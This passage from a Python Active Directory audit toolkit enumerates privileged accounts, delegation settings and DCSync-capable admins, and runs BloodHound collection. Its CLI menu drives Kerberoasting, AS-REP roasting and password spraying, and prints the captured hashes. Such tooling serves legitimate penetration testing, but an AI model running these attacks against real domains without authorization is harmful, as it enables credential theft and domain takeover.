            ('(objectCategory=domainDNS)', 'Domain'),
        ]

        for ldap_filter, obj_type in targets:
            entries = self._ldap_search(
                search_base=search_base,
                search_filter=ldap_filter,
                attributes=['distinguishedName', 'sAMAccountName', 'nTSecurityDescriptor']
            )

            for entry in entries:
                sd_raw = entry.get('nTSecurityDescriptor')
                obj_name = entry.get('sAMAccountName', entry.get('dn', ''))

                # If we got the SD, try to parse DACL
                if sd_raw:
                    # Binary SD parsing is complex; flag it for manual review
                    findings.append({
                        'target': obj_name,
                        'target_dn': entry.get('dn', ''),
                        'object_type': obj_type,
                        'has_sd': True,
                        'risk': 'Medium',
                        'permission': 'Security Descriptor present — manual ACL review recommended',
                        'principal': 'N/A',
                    })
                else:
                    # Without SD, check for common misconfigurations via group membership
                    findings.append({
                        'target': obj_name,
                        'target_dn': entry.get('dn', ''),
                        'object_type': obj_type,
                        'has_sd': False,
                        'risk': 'Low',
                        'permission': 'Could not read security descriptor (insufficient privileges)',
                        'principal': 'N/A',
                    })

        # Check for users who can DCSync (Replicating Directory Changes)
        repl_filter = '(&(objectCategory=person)(objectClass=user)(adminCount=1))'
        admin_entries = self._ldap_search(
            search_filter=repl_filter,
            attributes=['sAMAccountName', 'distinguishedName', 'memberOf']
        )
        for entry in admin_entries:
            member_of = entry.get('memberOf', [])
            if isinstance(member_of, str):
                member_of = [member_of]
            for group in member_of:
                group_lower = group.lower()
                if 'domain admins' in group_lower or 'enterprise admins' in group_lower:
                    findings.append({
                        'target': self.domain,
                        'target_dn': self.domain_dn,
                        'object_type': 'Domain',
                        'principal': entry.get('sAMAccountName', ''),
                        'permission': 'DCSync capable (Domain/Enterprise Admin)',
                        'risk': 'Critical',
                        'has_sd': True,
                    })
                    break

        self.results['acl_findings'] = findings
        self._save_results('acl_findings', findings)
        return {'findings': findings, 'count': len(findings)}

    def find_admin_accounts(self):
        """Enumerate Domain Admins, Enterprise Admins, Schema Admins, Account Operators."""
        if not self.is_connected():
            return {'error': 'Not connected', 'admins': []}

        admin_groups = [
            ('Domain Admins', f'CN=Domain Admins,CN=Users,{self.domain_dn}'),
            ('Enterprise Admins', f'CN=Enterprise Admins,CN=Users,{self.domain_dn}'),
            ('Schema Admins', f'CN=Schema Admins,CN=Users,{self.domain_dn}'),
            ('Account Operators', f'CN=Account Operators,CN=Builtin,{self.domain_dn}'),
            ('Administrators', f'CN=Administrators,CN=Builtin,{self.domain_dn}'),
            ('Server Operators', f'CN=Server Operators,CN=Builtin,{self.domain_dn}'),
            ('Backup Operators', f'CN=Backup Operators,CN=Builtin,{self.domain_dn}'),
        ]

        all_admins = []
        for group_name, group_dn in admin_groups:
            ldap_filter = f'(&(objectCategory=person)(objectClass=user)(memberOf={group_dn}))'
            entries = self._ldap_search(
                search_filter=ldap_filter,
                attributes=['sAMAccountName', 'displayName', 'userAccountControl',
                           'lastLogon', 'pwdLastSet', 'adminCount']
            )
            members = []
            for entry in entries:
                uac = int(entry.get('userAccountControl', 0) or 0)
                members.append({
                    'username': entry.get('sAMAccountName', ''),
                    'display_name': entry.get('displayName', ''),
                    'enabled': not bool(uac & 0x0002),
                    'last_logon': _ad_timestamp_to_str(entry.get('lastLogon', '0')),
                    'pwd_last_set': _ad_timestamp_to_str(entry.get('pwdLastSet', '0')),
                })

            all_admins.append({
                'group': group_name,
                'group_dn': group_dn,
                'members': members,
                'count': len(members),
            })

        self.results['admin_accounts'] = all_admins
        self._save_results('admin_accounts', all_admins)
        return {'admins': all_admins, 'total_groups': len(all_admins)}

    def find_unconstrained_delegation(self):
        """Find servers with unconstrained delegation (TRUSTED_FOR_DELEGATION)."""
        if not self.is_connected():
            return {'error': 'Not connected', 'servers': []}

        # 0x80000 = TRUSTED_FOR_DELEGATION, exclude DCs (0x2000)
        ldap_filter = (
            '(&(objectCategory=computer)'
            '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            '(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))'
        )
        attrs = ['sAMAccountName', 'dNSHostName', 'distinguishedName',
                 'operatingSystem', 'description']

        entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        servers = []
        for entry in entries:
            servers.append({
                'name': entry.get('sAMAccountName', '').rstrip('$'),
                'dns_name': entry.get('dNSHostName', ''),
                'dn': entry.get('dn', ''),
                'os': entry.get('operatingSystem', ''),
                'description': entry.get('description', ''),
                'risk': 'High',
            })

        self.results['unconstrained_delegation'] = servers
        return {'servers': servers, 'count': len(servers)}

    def find_constrained_delegation(self):
        """Find constrained delegation configurations."""
        if not self.is_connected():
            return {'error': 'Not connected', 'servers': []}

        ldap_filter = '(msDS-AllowedToDelegateTo=*)'
        attrs = ['sAMAccountName', 'dNSHostName', 'distinguishedName',
                 'msDS-AllowedToDelegateTo', 'objectCategory', 'operatingSystem',
                 'userAccountControl']

        entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        servers = []
        for entry in entries:
            delegate_to = entry.get('msDS-AllowedToDelegateTo', [])
            if isinstance(delegate_to, str):
                delegate_to = [delegate_to]
            elif delegate_to is None:
                delegate_to = []

            uac = int(entry.get('userAccountControl', 0) or 0)
            protocol_transition = bool(uac & 0x1000000)

            servers.append({
                'name': entry.get('sAMAccountName', '').rstrip('$'),
                'dns_name': entry.get('dNSHostName', ''),
                'dn': entry.get('dn', ''),
                'os': entry.get('operatingSystem', ''),
                'allowed_to_delegate_to': delegate_to,
                'protocol_transition': protocol_transition,
                'risk': 'High' if protocol_transition else 'Medium',
            })

        self.results['constrained_delegation'] = servers
        return {'servers': servers, 'count': len(servers)}

    # ========== BLOODHOUND ==========

    def bloodhound_collect(self, dc_host, domain, username, password):
        """Run BloodHound data collection.

        Tries bloodhound-python (SharpHound equivalent) via subprocess,
        falls back to manual LDAP-based collection.
        """
        output_dir = self.data_dir / 'bloodhound'
        output_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')

        collection_stats = {
            'users': 0, 'groups': 0, 'computers': 0,
            'sessions': 0, 'domains': 0,
            'files': [], 'method': '', 'timestamp': ts,
        }

        # Try bloodhound-python
        for cmd_prefix in ['bloodhound-python', 'python -m bloodhound']:
            cmd = (
                f'{cmd_prefix} -u {username} -p {password} '
                f'-d {domain} -dc {dc_host} -c All '
                f'--zip -o {output_dir}'
            )
            success, output = self._run_cmd(cmd, timeout=300)
            if success:
                collection_stats['method'] = 'bloodhound-python'
                # Count output files
                for f in output_dir.glob('*.json'):
                    collection_stats['files'].append(str(f.name))
                for f in output_dir.glob('*.zip'):
                    collection_stats['files'].append(str(f.name))
                # Parse counts from output
                for line in output.splitlines():
                    if 'users' in line.lower():
                        try:
                            collection_stats['users'] = int(''.join(c for c in line.split()[-1] if c.isdigit()) or 0)
                        except ValueError:
                            pass
                    if 'groups' in line.lower():
                        try:
                            collection_stats['groups'] = int(''.join(c for c in line.split()[-1] if c.isdigit()) or 0)
                        except ValueError:
                            pass
                    if 'computers' in line.lower():
                        try:
                            collection_stats['computers'] = int(''.join(c for c in line.split()[-1] if c.isdigit()) or 0)
                        except ValueError:
                            pass

                self.results['bloodhound'] = collection_stats
                self._save_results('bloodhound', collection_stats)
                return {
                    'success': True,
                    'stats': collection_stats,
                    'message': f'BloodHound collection complete via {cmd_prefix}'
                }

        # Fallback: manual LDAP collection into BloodHound-compatible JSON
        collection_stats['method'] = 'manual_ldap'

        # Collect users
        user_result = self.enumerate_users()
        users_data = user_result.get('users', [])
        collection_stats['users'] = len(users_data)
        users_file = output_dir / f'users_{ts}.json'
        with open(users_file, 'w') as f:
            json.dump({'data': users_data, 'meta': {'type': 'users', 'count': len(users_data)}}, f, indent=2, default=str)
        collection_stats['files'].append(users_file.name)

        # Collect groups
        group_result = self.enumerate_groups()
        groups_data = group_result.get('groups', [])
        collection_stats['groups'] = len(groups_data)
        groups_file = output_dir / f'groups_{ts}.json'
        with open(groups_file, 'w') as f:
            json.dump({'data': groups_data, 'meta': {'type': 'groups', 'count': len(groups_data)}}, f, indent=2, default=str)
        collection_stats['files'].append(groups_file.name)

        # Collect computers
        comp_result = self.enumerate_computers()
        comps_data = comp_result.get('computers', [])
        collection_stats['computers'] = len(comps_data)
        comps_file = output_dir / f'computers_{ts}.json'
        with open(comps_file, 'w') as f:
            json.dump({'data': comps_data, 'meta': {'type': 'computers', 'count': len(comps_data)}}, f, indent=2, default=str)
        collection_stats['files'].append(comps_file.name)

        # Domain info
        domain_info = {
            'name': self.domain,
            'dn': self.domain_dn,
            'dcs': self.results.get('dcs', []),
            'trusts': self.results.get('trusts', []),
        }
        collection_stats['domains'] = 1
        domain_file = output_dir / f'domains_{ts}.json'
        with open(domain_file, 'w') as f:
            json.dump({'data': [domain_info], 'meta': {'type': 'domains', 'count': 1}}, f, indent=2, default=str)
        collection_stats['files'].append(domain_file.name)

        self.results['bloodhound'] = collection_stats
        self._save_results('bloodhound', collection_stats)
        return {
            'success': True,
            'stats': collection_stats,
            'message': 'Manual LDAP collection complete (bloodhound-python not found — pip install bloodhound)'
        }

    # ========== EXPORT ==========

    def export_results(self, fmt='json'):
        """Export all collected enumeration and attack results."""
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')

        export_data = {
            'metadata': {
                'timestamp': ts,
                'domain': self.domain,
                'dc_host': self.dc_host,
                'format': fmt,
            },
            'results': {}
        }

        for key, value in self.results.items():
            if value:  # Only include non-empty results
                export_data['results'][key] = value

        if fmt == 'json':
            path = self.data_dir / f'ad_audit_export_{ts}.json'
            with open(path, 'w') as f:
                json.dump(export_data, f, indent=2, default=str)
            return {'success': True, 'path': str(path), 'format': 'json'}

        elif fmt == 'csv':
            import csv
            files = []
            for key, data in export_data['results'].items():
                if isinstance(data, list) and data:
                    path = self.data_dir / f'ad_audit_{key}_{ts}.csv'
                    with open(path, 'w', newline='') as f:
                        if isinstance(data[0], dict):
                            writer = csv.DictWriter(f, fieldnames=data[0].keys())
                            writer.writeheader()
                            for row in data:
                                # Flatten lists to strings
                                flat = {}
                                for k, v in row.items():
                                    flat[k] = '; '.join(v) if isinstance(v, list) else v
                                writer.writerow(flat)
                        else:
                            writer = csv.writer(f)
                            for item in data:
                                writer.writerow([item])
                    files.append(str(path))
            return {'success': True, 'files': files, 'format': 'csv'}

        return {'success': False, 'message': f'Unsupported format: {fmt}'}


# ========== SINGLETON ==========

_instance = None


def get_ad_audit():
    """Get or create singleton ADToolkit instance."""
    global _instance
    if _instance is None:
        _instance = ADToolkit()
    return _instance


# ========== CLI MENU ==========

def run():
    """CLI menu for Active Directory Audit module."""
    clear_screen()
    display_banner()
    ad = get_ad_audit()

    while True:
        print(f"\n{Colors.BOLD}{Colors.RED}Active Directory Audit{Colors.RESET}")
        print(f"{Colors.DIM}LDAP enumeration, Kerberoasting, password spray, ACL analysis{Colors.RESET}\n")

        # Connection status
        if ad.is_connected():
            print(f"  {Colors.GREEN}Connected:{Colors.RESET} {ad.dc_host} ({ad.domain}) as {ad.username or 'anonymous'}")
        else:
            print(f"  {Colors.YELLOW}Not connected{Colors.RESET}")

        print(f"\n  {Colors.CYAN}1{Colors.RESET} - Connect to DC")
        print(f"  {Colors.CYAN}2{Colors.RESET} - Enumerate Users")
        print(f"  {Colors.CYAN}3{Colors.RESET} - Enumerate Groups")
        print(f"  {Colors.CYAN}4{Colors.RESET} - Kerberoast")
        print(f"  {Colors.CYAN}5{Colors.RESET} - AS-REP Roast")
        print(f"  {Colors.CYAN}6{Colors.RESET} - Password Spray")
        print(f"  {Colors.CYAN}7{Colors.RESET} - ACL Analysis")
        print(f"  {Colors.CYAN}8{Colors.RESET} - BloodHound Collect")
        print(f"  {Colors.CYAN}9{Colors.RESET} - Enumerate Computers")
        print(f"  {Colors.CYAN}10{Colors.RESET} - Find Admin Accounts")
        print(f"  {Colors.CYAN}11{Colors.RESET} - Find Delegation")
        print(f"  {Colors.CYAN}12{Colors.RESET} - Export Results")
        print(f"  {Colors.CYAN}0{Colors.RESET} - Back\n")

        choice = input(f"{Colors.WHITE}Select> {Colors.RESET}").strip()

        if choice == '0':
            if ad.is_connected():
                ad.disconnect()
            break

        elif choice == '1':
            print(f"\n{Colors.BOLD}Connect to Domain Controller{Colors.RESET}")
            dc_host = input(f"  DC Host/IP: ").strip()
            domain = input(f"  Domain (e.g. corp.local): ").strip()
            username = input(f"  Username (blank=anonymous): ").strip() or None
            password = None
            if username:
                import getpass
                password = getpass.getpass(f"  Password: ") or None
            ssl = input(f"  Use SSL/LDAPS? (y/N): ").strip().lower() == 'y'

            if dc_host and domain:
                result = ad.connect(dc_host, domain, username, password, ssl)
                status = 'success' if result['success'] else 'error'
                ad.print_status(result['message'], status)
            else:
                ad.print_status('DC host and domain are required', 'error')

        elif choice == '2':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Enumerating users...', 'info')
            result = ad.enumerate_users()
            count = result.get('count', 0)
            ad.print_status(f'Found {count} users', 'success')
            for u in result.get('users', [])[:20]:
                flags = ', '.join(u.get('uac_flags', [])[:3])
                status_icon = '+' if u.get('enabled') else '-'
                print(f"  [{status_icon}] {u['username']:<25} {u.get('display_name', ''):<25} {flags}")
            if count > 20:
                print(f"  ... and {count - 20} more")

        elif choice == '3':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Enumerating groups...', 'info')
            result = ad.enumerate_groups()
            count = result.get('count', 0)
            ad.print_status(f'Found {count} groups', 'success')
            for g in result.get('groups', [])[:20]:
                print(f"  {g['name']:<35} Members: {g['member_count']:<5} {g['scope']}")
            if count > 20:
                print(f"  ... and {count - 20} more")

        elif choice == '4':
            print(f"\n{Colors.BOLD}Kerberoast{Colors.RESET}")
            dc = input(f"  DC Host/IP [{ad.dc_host or ''}]: ").strip() or ad.dc_host
            dom = input(f"  Domain [{ad.domain or ''}]: ").strip() or ad.domain
            user = input(f"  Username [{ad.username or ''}]: ").strip() or ad.username
            import getpass
            pwd = getpass.getpass(f"  Password: ") or ad.password
            if dc and dom and user and pwd:
                ad.print_status('Running Kerberoast...', 'info')
                result = ad.kerberoast(dc, dom, user, pwd)
                ad.print_status(result.get('message', ''), 'success' if result.get('count', 0) > 0 else 'warning')
                for h in result.get('hashes', []):
                    print(f"  {h[:80]}...")
            else:
                ad.print_status('All fields required', 'error')

        elif choice == '5':
            print(f"\n{Colors.BOLD}AS-REP Roast{Colors.RESET}")
            dc = input(f"  DC Host/IP [{ad.dc_host or ''}]: ").strip() or ad.dc_host
            dom = input(f"  Domain [{ad.domain or ''}]: ").strip() or ad.domain
            ul = input(f"  User list (comma-separated, blank=auto): ").strip()
            userlist = [u.strip() for u in ul.split(',')] if ul else None
            if dc and dom:
                ad.print_status('Running AS-REP Roast...', 'info')
                result = ad.asrep_roast(dc, dom, userlist)
                ad.print_status(result.get('message', ''), 'success' if result.get('count', 0) > 0 else 'warning')
                for h in result.get('hashes', []):
                    print(f"  {h[:80]}...")
            else:
                ad.print_status('DC and domain required', 'error')

        elif choice == '6':
            print(f"\n{Colors.BOLD}Password Spray{Colors.RESET}")
            dc = input(f"  DC Host/IP [{ad.dc_host or ''}]: ").strip() or ad.dc_host
            dom = input(f"  Domain [{ad.domain or ''}]: ").strip() or ad.domain
            ul = input(f"  User list (comma-separated): ").strip()
            import getpass
            pwd = getpass.getpass(f"  Password to spray: ")
            proto = input(f"  Protocol (ldap/smb) [ldap]: ").strip() or 'ldap'
            if dc and dom and ul and pwd:
                users = [u.strip() for u in ul.split(',')]
                ad.print_status(f'Spraying {len(users)} users with protocol={proto}...', 'info')
                result = ad.password_spray(users, pwd, dc, dom, proto)
                ad.print_status(
                    f'Done: {result["success_count"]} success, '
                    f'{result["failure_count"]} failed, '
                    f'{result["lockout_count"]} lockouts',
                    'success'
                )
                for r in result.get('results', []):
                    color = Colors.GREEN if r['status'] == 'success' else (Colors.RED if r['status'] == 'lockout' else Colors.DIM)
                    print(f"  {color}{r['username']:<25} {r['status']:<12} {r['message']}{Colors.RESET}")
            else:
                ad.print_status('All fields required', 'error')

        elif choice == '7':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Analyzing ACLs...', 'info')
            result = ad.analyze_acls()
            count = result.get('count', 0)
            ad.print_status(f'Found {count} ACL findings', 'success')
            for f in result.get('findings', []):
                risk_color = Colors.RED if f['risk'] == 'Critical' else (Colors.YELLOW if f['risk'] == 'High' else Colors.DIM)
                print(f"  {risk_color}[{f['risk']}]{Colors.RESET} {f['target']}: {f['permission']}")

        elif choice == '8':
            print(f"\n{Colors.BOLD}BloodHound Collection{Colors.RESET}")
            dc = input(f"  DC Host/IP [{ad.dc_host or ''}]: ").strip() or ad.dc_host
            dom = input(f"  Domain [{ad.domain or ''}]: ").strip() or ad.domain
            user = input(f"  Username [{ad.username or ''}]: ").strip() or ad.username
            import getpass
            pwd = getpass.getpass(f"  Password: ") or ad.password
            if dc and dom and user and pwd:
                ad.print_status('Running BloodHound collection (this may take a while)...', 'info')
                result = ad.bloodhound_collect(dc, dom, user, pwd)
                ad.print_status(result.get('message', ''), 'success' if result.get('success') else 'error')
                stats = result.get('stats', {})
                print(f"  Users: {stats.get('users', 0)}  Groups: {stats.get('groups', 0)}  Computers: {stats.get('computers', 0)}")
                print(f"  Files: {', '.join(stats.get('files', []))}")
            else:
                ad.print_status('All fields required', 'error')

        elif choice == '9':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Enumerating computers...', 'info')
            result = ad.enumerate_computers()
            count = result.get('count', 0)
            ad.print_status(f'Found {count} computers', 'success')
            for c in result.get('computers', [])[:20]:
                deleg = ' [UNCONSTRAINED DELEG]' if c.get('trusted_for_delegation') else ''
                print(f"  {c['name']:<25} {c.get('os', ''):<30} {c.get('dns_name', '')}{deleg}")

        elif choice == '10':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Finding admin accounts...', 'info')
            result = ad.find_admin_accounts()
            for grp in result.get('admins', []):
                print(f"\n  {Colors.BOLD}{grp['group']}{Colors.RESET} ({grp['count']} members)")
                for m in grp.get('members', []):
                    status_icon = Colors.GREEN + '+' if m['enabled'] else Colors.RED + '-'
                    print(f"    [{status_icon}{Colors.RESET}] {m['username']:<25} {m.get('display_name', '')}")

        elif choice == '11':
            if not ad.is_connected():
                ad.print_status('Not connected — connect first', 'error')
                continue
            ad.print_status('Finding delegation configurations...', 'info')
            uc = ad.find_unconstrained_delegation()
            cc = ad.find_constrained_delegation()
            print(f"\n  {Colors.BOLD}Unconstrained Delegation:{Colors.RESET} {uc.get('count', 0)} servers")
            for s in uc.get('servers', []):
                print(f"    {Colors.RED}[HIGH]{Colors.RESET} {s['name']} ({s.get('os', '')})")
            print(f"\n  {Colors.BOLD}Constrained Delegation:{Colors.RESET} {cc.get('count', 0)} servers")
            for s in cc.get('servers', []):
                print(f"    [{s['risk']}] {s['name']} -> {', '.join(s.get('allowed_to_delegate_to', []))}")

        elif choice == '12':
            fmt = input(f"  Format (json/csv) [json]: ").strip() or 'json'
            result = ad.export_results(fmt)
            if result.get('success'):
                ad.print_status(f'Exported to: {result.get("path", "") or ", ".join(result.get("files", []))}', 'success')
            else:
                ad.print_status(result.get('message', 'Export failed'), 'error')

        else:
            ad.print_status('Invalid selection', 'warning')

        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
